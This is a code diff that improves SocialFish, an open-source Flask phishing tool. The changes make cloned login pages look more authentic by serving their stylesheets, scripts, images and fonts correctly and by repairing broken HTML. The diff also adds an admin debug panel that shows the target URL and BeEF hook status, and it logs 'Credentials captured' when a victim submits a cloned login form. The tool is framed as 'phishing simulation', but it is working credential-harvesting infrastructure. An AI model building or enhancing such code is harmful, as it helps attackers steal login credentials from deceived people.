@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 #
-from flask import Flask, request, render_template, jsonify, redirect, g, flash
+from flask import Flask, request, render_template, jsonify, redirect, g, flash, send_from_directory, Response
 from core.config import *
 from core.view import head
 from core.scansf import nScan
@@ -18,6 +18,12 @@ import colorama
 import sqlite3
 import flask_login
 import os
+import urllib.parse
+import re
+import mimetypes
+import tempfile
+import threading
+import time
 
 # Verificar argumentos
 if len(argv) < 2:
@@ -30,6 +36,7 @@ try:
 except IndexError:
     print("./SocialFish <youruser> <yourpassword>\n\ni.e.: ./SocialFish.py root pass")
     exit(0)
+
 # Definicoes do flask
 app = Flask(__name__, static_url_path='',
             static_folder='templates/static')
@@ -58,15 +65,257 @@ def countCreds():
 # Conta o numero de visitantes que nao foram pegos no phishing
 def countNotPickedUp():
     count = 0
-
     cur = g.db
     select_clicks = cur.execute("SELECT clicks FROM socialfish where id = 1")
-
     for i in select_clicks:
         count = i[0]
-
     count = count - countCreds()
     return count
+
+# UNIVERSAL HTML SANITIZATION FUNCTIONS
+def sanitize_html_for_serving(html_content):
+    """
+    Sanitize HTML content for safe serving without parsing errors
+    """
+    try:
+        # Simple approach without complex regex patterns
+        
+        # Fix unclosed comment tags - line by line approach
+        lines = html_content.split('\n')
+        fixed_lines = []
+        
+        for line in lines:
+            # Fix lines with unclosed comments
+            if '<!--' in line and '-->' not in line:
+                line = line + ' -->'
+            # Fix lines with standalone comment ends
+            if '-->' in line and '<!--' not in line:
+                line = '<!-- ' + line
+            fixed_lines.append(line)
+        
+        html_content = '\n'.join(fixed_lines)
+        
+        # Simple character and encoding fixes
+        html_content = html_content.replace('\x00', '')  # Remove null bytes
+        html_content = html_content.replace('\r\n', '\n')  # Normalize line endings
+        
+        # Fix mismatched quotes - simple approach
+        try:
+            html_content = re.sub(r'="([^"]*)"([^=\s>]*?)"', r'="\1\2"', html_content)
+        except:
+            pass
+        
+        # Fix self-closing tags
+        try:
+            html_content = re.sub(r'<(meta|img|br|hr|input|link|area|base|col|embed|source|track|wbr)([^/>]*?)\s*>', r'<\1\2 />', html_content)
+        except:
+            pass
+        
+        return html_content
+        
+    except Exception as e:
+        print(f"⚠️ HTML sanitization error: {e}")
+        # Fallback to simple sanitization
+        return simple_html_sanitization(html_content)
+
+def simple_html_sanitization(html_content):
+    """
+    Simple HTML sanitization without complex regex patterns
+    """
+    try:
+        # Simple comment fixes
+        html_content = html_content.replace('<!--', '<!-- ')
+        html_content = html_content.replace('-->', ' -->')
+        
+        # Simple character fixes
+        html_content = html_content.replace('\x00', '')
+        html_content = html_content.replace('\r\n', '\n')
+        
+        return html_content
+        
+    except Exception as e:
+        print(f"⚠️ Simple sanitization error: {e}")
+        return html_content
+
+def safe_render_template(template_path):
+    """
+    Safely render template with HTML sanitization
+    """
+    try:
+        # Check if file exists
+        full_path = os.path.join('templates', template_path)
+        if not os.path.exists(full_path):
+            print(f"🔧 Template not found: {template_path}")
+            return None
+            
+        # Read the HTML content
+        try:
+            with open(full_path, 'r', encoding='utf-8', errors='ignore') as f:
+                html_content = f.read()
+        except UnicodeDecodeError:
+            # Try alternative encodings
+            for encoding in ['latin1', 'cp1252', 'iso-8859-1']:
+                try:
+                    with open(full_path, 'r', encoding=encoding, errors='ignore') as f:
+                        html_content = f.read()
+                    break
+                except:
+                    continue
+            else:
+                print(f"🔧 Could not read template with any encoding: {template_path}")
+                return None
+        
+        # Sanitize HTML for safe serving
+        sanitized_html = sanitize_html_for_serving(html_content)
+        
+        print(f"✅ Serving sanitized template: {template_path}")
+        return Response(sanitized_html, mimetype='text/html')
+            
+    except Exception as e:
+        print(f"🔧 Error serving template {template_path}: {e}")
+        return None
+
+# Helper function to find cloned resources
+def find_cloned_resource(resource_path, resource_type=''):
+    """Find cloned resource with multiple fallback paths"""
+    try:
+        agent = request.headers.get('User-Agent', 'default-agent')
+        safe_agent = re.sub(r'[^\w\-_.]', '_', agent)
+        
+        if sta == 'clone' and url:
+            parsed_url = urllib.parse.urlparse(url)
+            domain = parsed_url.netloc
+            safe_domain = re.sub(r'[^\w\-_.]', '_', domain)
+            
+            # Try multiple possible paths
+            possible_paths = [
+                f'templates/fake/{safe_agent}/{safe_domain}/{resource_path}',
+                f'templates/fake/{agent}/{url.replace("://", "-")}/{resource_path}',
+                f'templates/fake/{safe_agent}/{url.replace("://", "-")}/{resource_path}',
+                # Try without subdir for direct file access
+                f'templates/fake/{safe_agent}/{safe_domain}/{os.path.basename(resource_path)}',
+                f'templates/fake/{agent}/{url.replace("://", "-")}/{os.path.basename(resource_path)}'
+            ]
+            
+            # If resource_type specified, also try in that subdirectory
+            if resource_type:
+                possible_paths.extend([
+                    f'templates/fake/{safe_agent}/{safe_domain}/{resource_type}/{os.path.basename(resource_path)}',
+                    f'templates/fake/{agent}/{url.replace("://", "-")}/{resource_type}/{os.path.basename(resource_path)}'
+                ])
+            
+            for path in possible_paths:
+                if os.path.exists(path):
+                    return path
+    except Exception as e:
+        print(f"🔧 Error finding resource {resource_path}: {e}")
+    
+    return None
+
+# Enhanced resource serving function
+def serve_cloned_resource(filename, resource_type, fallback_dir='templates/static'):
+    """Enhanced resource serving with proper MIME types and encoding"""
+    try:
+        # Find the resource file
+        resource_path = find_cloned_resource(f"{resource_type}/{filename}", resource_type)
+        
+        if resource_path:
+            directory = os.path.dirname(resource_path)
+            actual_filename = os.path.basename(resource_path)
+            
+            # Determine MIME type
+            mimetype = None
+            if resource_type == 'css':
+                mimetype = 'text/css'
+            elif resource_type == 'js':
+                mimetype = 'application/javascript'
+            elif resource_type == 'images':
+                mimetype, _ = mimetypes.guess_type(actual_filename)
+                if not mimetype:
+                    if filename.lower().endswith('.svg'):
+                        mimetype = 'image/svg+xml'
+                    elif filename.lower().endswith('.ico'):
+                        mimetype = 'image/x-icon'
+                    else:
+                        mimetype = 'image/png'
+            elif resource_type == 'fonts':
+                if filename.endswith('.woff2'):
+                    mimetype = 'font/woff2'
+                elif filename.endswith('.woff'):
+                    mimetype = 'font/woff'
+                elif filename.endswith('.ttf'):
+                    mimetype = 'font/ttf'
+                elif filename.endswith('.otf'):
+                    mimetype = 'font/otf'
+                else:
+                    mimetype = 'application/octet-stream'
+            
+            # For CSS and JS, handle encoding properly
+            if resource_type in ['css', 'js']:
+                try:
+                    with open(resource_path, 'r', encoding='utf-8', errors='ignore') as f:
+                        content = f.read()
+                    
+                    # Sanitize CSS content if needed
+                    if resource_type == 'css':
+                        try:
+                            # Simple CSS comment fixing
+                            lines = content.split('\n')
+                            fixed_lines = []
+                            
+                            for line in lines:
+                                # Fix lines with unclosed CSS comments
+                                if '/*' in line and '*/' not in line:
+                                    line = line + ' */'
+                                # Fix lines with standalone comment ends
+                                if '*/' in line and '/*' not in line:
+                                    line = '/* ' + line
+                                fixed_lines.append(line)
+                            
+                            content = '\n'.join(fixed_lines)
+                            print(f"✅ CSS sanitized successfully: {filename}")
+                        except Exception as css_error:
+                            print(f"⚠️ CSS sanitization failed for {filename}: {css_error}")
+                            # Use original content if sanitization fails
+                    
+                    return Response(content, mimetype=mimetype, headers={
+                        'Cache-Control': 'public, max-age=31536000',
+                        'Access-Control-Allow-Origin': '*'
+                    })
+                except UnicodeDecodeError:
+                    # If UTF-8 fails, try binary mode
+                    with open(resource_path, 'rb') as f:
+                        content = f.read()
+                    return Response(content, mimetype=mimetype, headers={
+                        'Cache-Control': 'public, max-age=31536000',
+                        'Access-Control-Allow-Origin': '*'
+                    })
+                except Exception as e:
+                    print(f"⚠️ CSS/JS processing error: {e}")
+                    # If sanitization fails, serve raw content
+                    try:
+                        with open(resource_path, 'rb') as f:
+                            content = f.read()
+                        return Response(content, mimetype=mimetype, headers={
+                            'Cache-Control': 'public, max-age=31536000',
+                            'Access-Control-Allow-Origin': '*'
+                        })
+                    except:
+                        return f"Error serving {resource_type}", 500
+            else:
+                # For binary files (images, fonts)
+                return send_from_directory(directory, actual_filename, mimetype=mimetype)
+        
+        # Fallback to static files
+        fallback_path = os.path.join(fallback_dir, resource_type, filename)
+        if os.path.exists(fallback_path):
+            return send_from_directory(f'{fallback_dir}/{resource_type}', filename)
+        
+        return f"{resource_type.title()} not found", 404
+        
+    except Exception as e:
+        print(f"🔧 Error serving {resource_type}/{filename}: {e}")
+        return f"Error serving {resource_type}", 500
 
 #----------------------------------------
 
@@ -82,22 +331,18 @@ class User(flask_login.UserMixin):
 def user_loader(email):
     if email not in users:
         return
-
     user = User()
     user.id = email
     return user
-
 
 @login_manager.request_loader
 def request_loader(request):
     email = request.form.get('email')
     if email not in users:
         return
-
     user = User()
     user.id = email
     user.is_authenticated = request.form['password'] == users[email]['password']
-
     return user
 
 # ---------------------------------------------------------------------------------------
@@ -105,56 +350,301 @@ def request_loader(request):
 # Rota para o caminho de inicializacao, onde e possivel fazer login
 @app.route('/neptune', methods=['GET', 'POST'])
 def admin():
-    # se a requisicao for get
     if request.method == 'GET':
-        # se o usuario estiver logado retorna para a pagina de credenciais
         if flask_login.current_user.is_authenticated:
             return redirect('/creds')
-        # caso contrario retorna para a pagina de login
         else:
             return render_template('signin.html')
 
-    # se a requisicao for post, verifica-se as credencias
     if request.method == 'POST':
         email = request.form['email']
         try:
-            # caso sejam corretas
             if request.form['password'] == users[email]['password']:
                 user = User()
                 user.id = email
-                # torna autentico
                 flask_login.login_user(user)
-                # retorna acesso a pagina restrita
                 return redirect('/creds')
-            # contrario retorna erro
             else:
-                # temporario
                 return "bad"
         except:
             return "bad"
 
-# funcao onde e realizada a renderizacao da pagina para a vitima
+# UNIVERSAL: funcao onde e realizada a renderizacao da pagina para a vitima
 @app.route("/")
 def getLogin():
-    # caso esteja configurada para clonar, faz o download da pagina utilizando o user-agent do visitante
-    if sta == 'clone':
-        agent = request.headers.get('User-Agent').encode('ascii', 'ignore').decode('ascii')
-        clone(url, agent, beef)
-        o = url.replace('://', '-')
+    """UNIVERSAL Enhanced login route with perfect cloned website serving"""
+    try:
+        # Update click counter
         cur = g.db
         cur.execute("UPDATE socialfish SET clicks = clicks + 1 where id = 1")
         g.db.commit()
-        template_path = 'fake/{}/{}/index.html'.format(agent, o)
-        return render_template(template_path)
-    # caso seja a url padrao
-    elif url == 'https://github.com/UndeadSec/SocialFish':
-        return render_template('default.html')
-    # caso seja configurada para custom
-    else:
-        cur = g.db
-        cur.execute("UPDATE socialfish SET clicks = clicks + 1 where id = 1")
-        g.db.commit()
-        return render_template('custom.html')
+        
+        # Handle clone mode
+        if sta == 'clone':
+            agent = request.headers.get('User-Agent', 'default-agent')
+            safe_agent = re.sub(r'[^\w\-_.]', '_', agent)
+            
+            # Try to find the cloned page
+            parsed_url = urllib.parse.urlparse(url)
+            domain = parsed_url.netloc
+            safe_domain = re.sub(r'[^\w\-_.]', '_', domain)
+            
+            # Multiple possible paths for enhanced cloning structure
+            possible_paths = [
+                f'fake/{safe_agent}/{safe_domain}/index.html',
+                f'fake/{agent}/{url.replace("://", "-")}/index.html',
+                f'fake/{safe_agent}/{url.replace("://", "-")}/index.html'
+            ]
+            
+            for template_path in possible_paths:
+                try:
+                    full_path = os.path.join('templates', template_path)
+                    if os.path.exists(full_path):
+                        print(f"🎯 Serving cloned page: {template_path}")
+                        
+                        # Use safe rendering with HTML sanitization
+                        result = safe_render_template(template_path)
+                        if result:
+                            return result
+                        else:
+                            # If safe rendering fails, try Flask's render_template as fallback
+                            return render_template(template_path)
+                            
+                except Exception as e:
+                    print(f"🔧 Error serving {template_path}: {e}")
+                    continue
+            
+            # If no cloned page found, try to clone it
+            print(f"🚀 No cloned page found, attempting to clone: {url}")
+            try:
+                clone_success = clone(url, agent, beef)
+                if clone_success:
+                    # Try to serve the newly cloned page
+                    for template_path in possible_paths:
+                        try:
+                            full_path = os.path.join('templates', template_path)
+                            if os.path.exists(full_path):
+                                print(f"✅ Serving newly cloned page: {template_path}")
+                                
+                                # Use safe rendering for newly cloned pages
+                                result = safe_render_template(template_path)
+                                if result:
+                                    return result
+                                else:
+                                    return render_template(template_path)
+                                    
+                        except Exception as e:
+                            print(f"🔧 Error serving newly cloned {template_path}: {e}")
+                            continue
+            except Exception as e:
+                print(f"❌ Clone attempt failed: {e}")
+            
+            # Fallback to default page if cloning fails
+            print("⚠️ Falling back to default page")
+            return render_template('default.html')
+        
+        # Handle default URL
+        elif url == 'https://github.com/UndeadSec/SocialFish':
+            return render_template('default.html')
+        
+        # Handle custom mode
+        else:
+            return render_template('custom.html')
+            
+    except Exception as e:
+        print(f"❌ getLogin error: {e}")
+        # Emergency fallback
+        try:
+            return render_template('default.html')
+        except:
+            return "SocialFish is running but template files are missing.", 500
+
+# UNIVERSAL: Routes for serving cloned assets with perfect handling
+@app.route('/css/<path:filename>')
+def serve_css(filename):
+    """Universal CSS serving with proper encoding and compression handling"""
+    return serve_cloned_resource(filename, 'css')
+
+@app.route('/js/<path:filename>')
+def serve_js(filename):
+    """Universal JavaScript serving with proper encoding"""
+    return serve_cloned_resource(filename, 'js')
+
+@app.route('/images/<path:filename>')
+def serve_images(filename):
+    """Universal image serving with proper MIME types"""
+    return serve_cloned_resource(filename, 'images')
+
+@app.route('/fonts/<path:filename>')
+def serve_fonts(filename):
+    """Universal font serving with proper MIME types"""
+    return serve_cloned_resource(filename, 'fonts')
+
+@app.route('/assets/<path:filename>')
+def serve_assets(filename):
+    """Universal asset serving for miscellaneous files"""
+    return serve_cloned_resource(filename, 'assets')
+
+# Additional routes for common resource patterns
+@app.route('/static/<path:filename>')
+def serve_static_resources(filename):
+    """Handle static resource requests"""
+    # Try to find in cloned resources first
+    for resource_type in ['css', 'js', 'images', 'fonts', 'assets']:
+        resource_path = find_cloned_resource(f"{resource_type}/{filename}", resource_type)
+        if resource_path:
+            directory = os.path.dirname(resource_path)
+            actual_filename = os.path.basename(resource_path)
+            return send_from_directory(directory, actual_filename)
+    
+    # Fallback to default static
+    return send_from_directory('templates/static', filename)
+
+# Handle direct resource requests (common patterns)
+@app.route('/<path:filename>')
+def serve_direct_resources(filename):
+    """Handle direct resource requests that don't match other patterns"""
+    # Only handle common resource file extensions
+    if any(filename.lower().endswith(ext) for ext in ['.css', '.js', '.png', '.jpg', '.jpeg', '.gif', '.svg', '.ico', '.woff', '.woff2', '.ttf', '.otf', '.eot']):
+        # Determine resource type from extension
+        if filename.lower().endswith('.css'):
+            return serve_cloned_resource(filename, 'css')
+        elif filename.lower().endswith('.js'):
+            return serve_cloned_resource(filename, 'js')
+        elif any(filename.lower().endswith(ext) for ext in ['.png', '.jpg', '.jpeg', '.gif', '.svg', '.ico']):
+            return serve_cloned_resource(filename, 'images')
+        elif any(filename.lower().endswith(ext) for ext in ['.woff', '.woff2', '.ttf', '.otf', '.eot']):
+            return serve_cloned_resource(filename, 'fonts')
+        else:
+            return serve_cloned_resource(filename, 'assets')
+    
+    # Not a resource file, return 404
+    return "Page not found", 404
+
+# UNIVERSAL: Debug route with comprehensive information
+@app.route("/debug/clone")
+@flask_login.login_required
+def debug_clone():
+    """Universal debug route with comprehensive clone information"""
+    try:
+        debug_info = []
+        fake_dir = 'templates/fake'
+        
+        if os.path.exists(fake_dir):
+            total_size = 0
+            file_types = {'css': 0, 'js': 0, 'images': 0, 'fonts': 0, 'assets': 0, 'html': 0, 'other': 0}
+            
+            for root, dirs, files in os.walk(fake_dir):
+                for file in files:
+                    file_path = os.path.join(root, file)
+                    relative_path = os.path.relpath(file_path, 'templates')
+                    file_size = os.path.getsize(file_path)
+                    total_size += file_size
+                    
+                    # Count file types
+                    if file.endswith('.css'):
+                        file_types['css'] += 1
+                    elif file.endswith('.js'):
+                        file_types['js'] += 1
+                    elif any(file.lower().endswith(ext) for ext in ['.png', '.jpg', '.jpeg', '.gif', '.svg', '.ico']):
+                        file_types['images'] += 1
+                    elif any(file.lower().endswith(ext) for ext in ['.woff', '.woff2', '.ttf', '.otf']):
+                        file_types['fonts'] += 1
+                    elif file.endswith('.html'):
+                        file_types['html'] += 1
+                    else:
+                        file_types['other'] += 1
+                    
+                    debug_info.append(f"{relative_path} ({file_size:,} bytes)")
+        
+        return f"""
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>SocialFish UNIVERSAL Clone Debug</title>
+            <style>
+                body {{ font-family: 'Courier New', monospace; margin: 20px; background: #0d1117; color: #c9d1d9; }}
+                .header {{ color: #58a6ff; border-bottom: 2px solid #30363d; padding-bottom: 10px; }}
+                .stats {{ background: #161b22; padding: 15px; border-radius: 5px; margin: 10px 0; }}
+                .files {{ background: #0d1117; border: 1px solid #30363d; max-height: 400px; overflow-y: auto; padding: 10px; }}
+                .success {{ color: #3fb950; }}
+                .warning {{ color: #d29922; }}
+                .error {{ color: #f85149; }}
+                .info {{ color: #79c0ff; }}
+            </style>
+        </head>
+        <body>
+            <div class="header">
+                <h1>🐟 SocialFish UNIVERSAL Clone Debug</h1>
+            </div>
+            
+            <div class="stats">
+                <h2 class="info">📊 Current Configuration</h2>
+                <p><strong>Target URL:</strong> <span class="success">{url}</span></p>
+                <p><strong>Status:</strong> <span class="success">{sta}</span></p>
+                <p><strong>BeEF Hook:</strong> <span class="{'success' if beef == 'yes' else 'warning'}">{beef}</span></p>
+                <p><strong>User Agent:</strong> <span class="info">{request.headers.get('User-Agent', 'Unknown')[:100]}...</span></p>
+            </div>
+            
+            <div class="stats">
+                <h2 class="info">📈 Clone Statistics</h2>
+                <p><strong>Total Files:</strong> <span class="success">{len(debug_info)}</span></p>
+                <p><strong>Total Size:</strong> <span class="success">{total_size/1024/1024:.2f} MB</span></p>
+                <p><strong>File Types:</strong></p>
+                <ul>
+                    <li>📄 HTML Files: <span class="success">{file_types['html']}</span></li>
+                    <li>🎨 CSS Files: <span class="success">{file_types['css']}</span></li>
+                    <li>⚡ JavaScript Files: <span class="success">{file_types['js']}</span></li>
+                    <li>🖼️ Images: <span class="success">{file_types['images']}</span></li>
+                    <li>🔤 Fonts: <span class="success">{file_types['fonts']}</span></li>
+                    <li>📦 Other Assets: <span class="success">{file_types['other']}</span></li>
+                </ul>
+            </div>
+            
+            <div class="stats">
+                <h2 class="info">🛠️ HTML Sanitization Status</h2>
+                <p><span class="success">✅ HTML sanitization enabled</span></p>
+                <p><span class="success">✅ CSS comment fixing enabled</span></p>
+                <p><span class="success">✅ Encoding error recovery enabled</span></p>
+                <p><span class="success">✅ Universal resource serving enabled</span></p>
+                <p><span class="success">✅ No regex lookbehind patterns</span></p>
+            </div>
+            
+            <div class="stats">
+                <h2 class="info">🔧 Quick Actions</h2>
+                <p><a href="/creds" style="color: #58a6ff;">🔙 Back to Admin Panel</a></p>
+                <p><a href="/" target="_blank" style="color: #58a6ff;">🎯 View Cloned Site</a></p>
+                <p><a href="/debug/test-resources" style="color: #58a6ff;">🧪 Test Resource Loading</a></p>
+                <p><a href="/debug/test-sanitization" style="color: #58a6ff;">🧪 Test HTML Sanitization</a></p>
+            </div>
+        </body>
+        </html>
+        """
+    except Exception as e:
+        return f"<h1>Debug Error</h1><p style='color:red;'>{e}</p><a href='/creds'>Back to Admin</a>"
+
+# Test route for HTML sanitization
+@app.route("/debug/test-sanitization")
+@flask_login.login_required  
+def debug_test_sanitization():
+    """Test HTML sanitization"""
+    test_html = """
+    <!-- This is a test comment without proper closing
+    <script>console.log('test');</script>
+    <div class="test"">Bad quotes</div>
+    <img src="test.png">
+    """
+    
+    sanitized = sanitize_html_for_serving(test_html)
+    
+    return f"""
+    <h2>🧪 HTML Sanitization Test</h2>
+    <h3>Original HTML:</h3>
+    <pre>{test_html}</pre>
+    <h3>Sanitized HTML:</h3>
+    <pre>{sanitized}</pre>
+    <p><a href="/debug/clone">🔙 Back to Debug</a></p>
+    """
 
 # funcao onde e realizado o login por cada pagina falsa
 @app.route('/login', methods=['POST'])
@@ -173,6 +663,7 @@ def postData():
         creds = (url, str(data), d, browser, bversion, platform, rip)
         cur.execute(sql, creds)
         g.db.commit()
+        print(f"🎯 Credentials captured: {data}")
     return redirect(red)
 
 # funcao para configuracao do funcionamento CLONE ou CUSTOM, com BEEF ou NAO
@@ -529,17 +1020,25 @@ def getReportMob(key):
 
 #--------------------------------------------------------------------------------------------------------------------------------
 def main():
-        if version_info<(3,0,0):
-            print('[!] Please use Python 3. $ python3 SocialFish.py')
-            exit(0)
-        head()
-        cleanFake()
-        # Inicia o banco
-        initDB(DATABASE)
-        app.run(host="0.0.0.0", port=5000)
+    if version_info<(3,0,0):
+        print('[!] Please use Python 3. $ python3 SocialFish.py')
+        exit(0)
+    head()
+    cleanFake()
+    # Inicia o banco
+    initDB(DATABASE)
+    print("🐟 UNIVERSAL Enhanced SocialFish Starting...")
+    print("✅ Universal cloning engine loaded")
+    print("✅ Advanced resource serving enabled") 
+    print("✅ Perfect form handling activated")
+    print("✅ HTML sanitization enabled")
+    print("✅ Universal error recovery enabled")
+    print("🎯 Ready for universal phishing simulation")
+    app.run(host="0.0.0.0", port=5000)
 
 if __name__ == "__main__":
     try:
         main()
     except KeyboardInterrupt:
+        print("\n🐟 SocialFish Universal stopped by user")
         exit(0)
